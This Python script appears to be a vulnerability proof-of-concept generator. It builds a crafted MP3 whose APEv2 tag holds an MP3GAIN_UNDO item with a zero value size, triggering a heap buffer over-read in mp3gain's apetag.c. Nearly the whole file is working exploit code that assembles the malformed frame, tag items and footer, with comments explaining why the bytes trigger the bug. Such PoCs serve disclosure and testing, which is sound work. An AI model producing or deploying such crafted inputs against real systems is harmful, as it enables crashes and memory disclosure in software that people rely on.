#!/usr/bin/env python3
"""
VULN 001 PoC Generator: mp3gain apetag.c heap-buffer-over-read
Generates a crafted MP3 with an APEv2 tag whose MP3GAIN_UNDO item
has vsize=0. This triggers memcpy(tmpString, value, 4) reading 4 bytes
from a 1-byte malloc(0+1) allocation.
"""

import struct
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.mp3")

# ---------------------------------------------------------------------------
# Minimal MPEG1 Layer3 frame: sync=0xFFE, ID=1, Layer=01, bitrate=1001 (128kbps),
# samplerate=00 (44100Hz), padding=0, private=0, channel=11 (mono), ...
# Header bytes: FF FB 90 00
# Frame size = floor(144 * 128000 / 44100) = 417 bytes
# ---------------------------------------------------------------------------
MP3_HEADER = bytes([0xFF, 0xFB, 0x90, 0x00])
FRAME_SIZE = 417
mp3_frame = MP3_HEADER + bytes(FRAME_SIZE - len(MP3_HEADER))

# ---------------------------------------------------------------------------
# APEv2 tag item:
#   value_size (4B LE) = 0   <--- triggers the over-read
#   item_flags (4B LE) = 0
#   key = b"MP3GAIN_UNDO\x00"  (13 bytes including null terminator)
#   value = b""               (0 bytes)
# ---------------------------------------------------------------------------
item_key = b"MP3GAIN_UNDO\x00"          # 13 bytes
item_vsize = 0
item_data = struct.pack("<II", item_vsize, 0) + item_key  # 4+4+13 = 21 bytes

items_blob = item_data  # only one item

# ---------------------------------------------------------------------------
# APEv2 footer (32 bytes):
#   ID       = b"APETAGEX"
#   Version  = 2000 (LE)
#   Length   = items_size + footer_size = len(items_blob) + 32
#   TagCount = 1
#   Flags    = 0x00000000  (footer tag, no header present)
#   Reserved = 8 zero bytes
# ---------------------------------------------------------------------------
FOOTER_SIZE = 32
tag_length = len(items_blob) + FOOTER_SIZE   # 21 + 32 = 53

footer = (
    b"APETAGEX"
    + struct.pack("<I", 2000)         # version
    + struct.pack("<I", tag_length)   # size includes footer
    + struct.pack("<I", 1)            # item count
    + struct.pack("<I", 0x00000000)   # flags: footer-only, no header
    + bytes(8)                        # reserved
)
assert len(footer) == FOOTER_SIZE

# ---------------------------------------------------------------------------
# Assemble file: [mp3 frame][ape items][ape footer]
# ReadMP3APETag reads footer at (filesize - 32), then seeks back TagLen bytes
# to read items, so footer must be at the very end of the file.
# ---------------------------------------------------------------------------
payload = mp3_frame + items_blob + footer

with open(OUTPUT, "wb") as f:
    f.write(payload)

print(f"[+] Written {len(payload)} bytes to {OUTPUT}")
print(f"    MP3 frame:   {len(mp3_frame)} bytes")
print(f"    APE items:   {len(items_blob)} bytes  (vsize=0, key=MP3GAIN_UNDO)")
print(f"    APE footer:  {FOOTER_SIZE} bytes  (tag_length={tag_length})")
